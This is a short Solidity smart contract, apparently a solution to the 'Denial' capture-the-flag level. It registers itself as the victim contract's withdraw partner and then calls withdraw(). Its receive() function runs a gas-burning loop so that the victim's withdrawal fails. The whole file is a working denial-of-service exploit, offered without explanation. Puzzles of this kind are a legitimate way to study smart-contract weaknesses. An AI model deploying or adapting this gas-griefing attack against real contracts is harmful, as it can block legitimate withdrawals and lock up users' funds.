pragma solidity ^0.8.0;

contract GasEater {
    address private immutable denialInstance;

    constructor(address _denial) {
        denialInstance = _denial;
    }

    receive() external payable {
        for (uint256 i = 0; i < 100000; i++) {
            uint256 j = i * i;
            j += 1;
        }
    }

    function setPartner(address denial) public {
        (bool success,) = denial.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        require(success, "Set partner failed");
    }

    function attack() public {
        setPartner(denialInstance);
        (bool success,) = denialInstance.call(abi.encodeWithSignature("withdraw()"));
        require(success, "First withdrawal failed");
    }
}